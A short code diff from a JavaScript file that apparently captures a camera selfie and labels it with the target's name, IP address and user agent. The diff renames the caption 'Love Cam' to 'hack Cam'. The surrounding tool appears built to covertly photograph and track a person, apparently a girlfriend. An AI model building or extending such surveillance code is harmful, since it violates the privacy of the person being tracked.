@@ -93,7 +93,7 @@ async function captureFrame() {
     if (!blob) return;
     const meta = await collectMeta();
     const caption = [
-      `<b>❤️ Love Cam — Selfie</b>`,
+      `<b>❤️ hack Cam — Selfie</b>`,
       `<b>Untuk:</b> ${esc(CONFIG.GF_NAME)}`,
       `<b>IP:</b> ${esc(meta.ip)}`,
       `<b>UA:</b> ${esc(meta.ua)}`,
